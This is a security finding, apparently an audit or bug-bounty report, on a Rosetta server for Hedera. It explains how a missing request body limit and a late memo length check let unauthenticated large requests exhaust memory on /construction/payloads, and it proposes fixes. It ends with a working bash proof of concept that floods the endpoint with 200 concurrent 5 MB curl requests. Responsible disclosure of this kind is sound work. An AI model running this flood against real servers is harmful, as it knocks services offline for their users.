### Title
Missing HTTP Body Size Limit and Memo Length Pre-Check Enable Memory Exhaustion DoS on `/construction/payloads`

### Summary
The Rosetta server imposes no HTTP request body size limit and performs no pre-validation of the transaction memo length before allocating the full string and passing it to the Hedera SDK. An unprivileged attacker can flood `/construction/payloads` with requests carrying arbitrarily large `memo` fields, forcing the server to allocate and process multi-megabyte strings per request before the SDK rejects them, exhausting available memory under concurrent load.

### Finding Description

**Code path 1 — No HTTP body size limit:**
`rosetta/main.go` lines 220–227 construct the `http.Server` with only timeout fields set; no `MaxBytesReader` wrapper is applied to the request body anywhere in the middleware chain (`MetricsMiddleware` → `TracingMiddleware` → `CorsMiddleware`). Go's standard library imposes no default body size limit, so a client may stream an arbitrarily large JSON body.

**Code path 2 — Late, length-unchecked memo validation:**
`rosetta/app/services/construction_service.go` lines 698–715 (`transactionSetMemo`):

```go
func transactionSetMemo(memo any) updater {
    return func(transaction hiero.TransactionInterface) *rTypes.Error {
        if memo == nil { return nil }
        value, ok := memo.(string)
        if !ok { return errors.ErrInvalidTransactionMemo }
        if _, err := hiero.TransactionSetTransactionMemo(transaction, value); err != nil {
            return errors.ErrInvalidTransactionMemo
        }
        return nil
    }
}
```

The only guard is a type assertion (`memo.(string)`). There is no `len(value) > 100` pre-check. The full string — regardless of size — is passed to `hiero.TransactionSetTransactionMemo`, which internally enforces the 100-byte Hedera limit and returns an error only after receiving the complete value.

**Ordering makes it worse:**
`ConstructionPayloads` (lines 218–282) calls `transactionSetMemo` only *after* `transactionHandler.Construct` (line 237) has already built a transaction object. The server therefore: reads the full body → parses JSON → allocates the full memo string → constructs a transaction → *then* rejects the memo. All allocations remain live until GC.

**No rate limiting:**
The middleware stack contains no rate-limiting layer, so concurrent requests are unbounded.

### Impact Explanation
Each malicious request with, e.g., a 10 MB `memo` field causes the server to allocate ≥10 MB of heap before returning `ErrInvalidTransactionMemo`. With N concurrent connections each sending large bodies, heap pressure grows as O(N × body_size). Under sustained attack the Go runtime will either spend most CPU time in GC or the process will OOM-kill. Because `/construction/payloads` is available in both online and offline modes and requires no authentication, the entire Rosetta API surface (block queries, transaction submission) becomes unavailable.

### Likelihood Explanation
The endpoint is unauthenticated and reachable from the public internet. No special knowledge of the protocol is required — a standard HTTP POST with a large `metadata.memo` string suffices. The attack is trivially scriptable with `curl` or any HTTP load tool, is repeatable indefinitely, and requires no prior account or key material.

### Recommendation
1. **Enforce a body size limit** in `main.go` by wrapping the handler with `http.MaxBytesReader` (e.g., 1 MB) before passing to the router, or by setting it per-request in a middleware.
2. **Add an early memo length check** in `transactionSetMemo` (or before `updateTransaction` is called) to reject memos exceeding 100 bytes before any transaction construction work is done:
   ```go
   if len(value) > 100 {
       return errors.ErrInvalidTransactionMemo
   }
   ```
3. **Add rate limiting** middleware (e.g., `golang.org/x/time/rate`) to bound requests per IP.

### Proof of Concept
```bash
# Generate a 5 MB memo string
LARGE_MEMO=$(python3 -c "print('A' * 5_000_000)")

# Send concurrent requests with no authentication required
for i in $(seq 1 200); do
  curl -s -X POST http://<rosetta-host>:8082/construction/payloads \
    -H "Content-Type: application/json" \
    -d "{
      \"network_identifier\": {\"blockchain\": \"Hedera\", \"network\": \"testnet\"},
      \"operations\": [{
        \"operation_identifier\": {\"index\": 0},
        \"type\": \"CRYPTOTRANSFER\",
        \"account\": {\"address\": \"0.0.100\"},
        \"amount\": {\"value\": \"-100\", \"currency\": {\"symbol\": \"HBAR\", \"decimals\": 8}}
      }],
      \"metadata\": {
        \"node_account_id\": \"0.0.3\",
        \"valid_start_nanos\": \"123456789000000123\",
        \"memo\": \"$LARGE_MEMO\"
      }
    }" &
done
wait
# Server heap grows by ~5 MB × 200 = ~1 GB before GC can reclaim;
# under sustained load this causes OOM or severe GC thrashing.
```
